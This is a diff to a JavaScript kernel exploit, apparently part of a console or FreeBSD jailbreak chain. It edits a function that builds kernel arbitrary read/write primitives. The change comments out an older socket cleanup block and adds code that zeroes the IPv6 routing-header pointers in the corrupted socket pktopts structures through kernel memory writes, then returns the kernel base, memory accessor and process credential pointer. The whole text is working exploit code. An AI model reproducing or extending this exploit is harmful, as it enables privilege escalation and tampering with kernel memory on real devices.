@@ -1482,7 +1482,7 @@ function make_kernel_arw(pktopts_sds, dirty_sd, k100_addr, kernel_addr, sds) {
 
 
 
-    var  SIZEOF_OFILES = 0x8;
+/*    var  SIZEOF_OFILES = 0x8;
    var SO_PCB        = 0x18;
   var  INPCB_PKTOPTS = 0x118;
 
@@ -1507,7 +1507,7 @@ for (let sd of [reclaim_sock, worker_sock, ...sds]) {
             log(`skip clean rthdr fd=${sd}: ${e}`);
         }
     }
-
+*/
     
   
   /* const bump_fds = [
@@ -1535,6 +1535,24 @@ for (let sd of bump_fds) {
     kmem.write32(worker_sock, kmem.read32(worker_sock) + 1);
     // +2 since we have to take into account the fget_write()'s reference
     kmem.write32(pipe_file.add(0x28), kmem.read32(pipe_file.add(0x28)) + 2);*/
+
+
+/*kmem.write32(master_sock,       0x100);
+kmem.write32(worker_sock,       0x100);
+kmem.write32(reclaim_sock,      0x100);
+    log("EXTRA CLEAN");*/
+
+
+    for (let i = 0; i < sds.length; i++) {
+  const pkto = get_sock_pktopts(sds[i]);
+  kmem.write64(pkto.add(off_ip6po_rthdr), 0);
+}
+
+    const reclaimPkto = get_sock_pktopts(reclaim_sock);
+kmem.write64(reclaimPkto.add(off_ip6po_rthdr), 0);
+
+ 
+kmem.write64(worker_pktopts.add(off_ip6po_rthdr), 0);
     
     return [kbase, kmem, p_ucred, [kpipe, pipe_save, pktinfo_p, w_pktinfo]];
 }
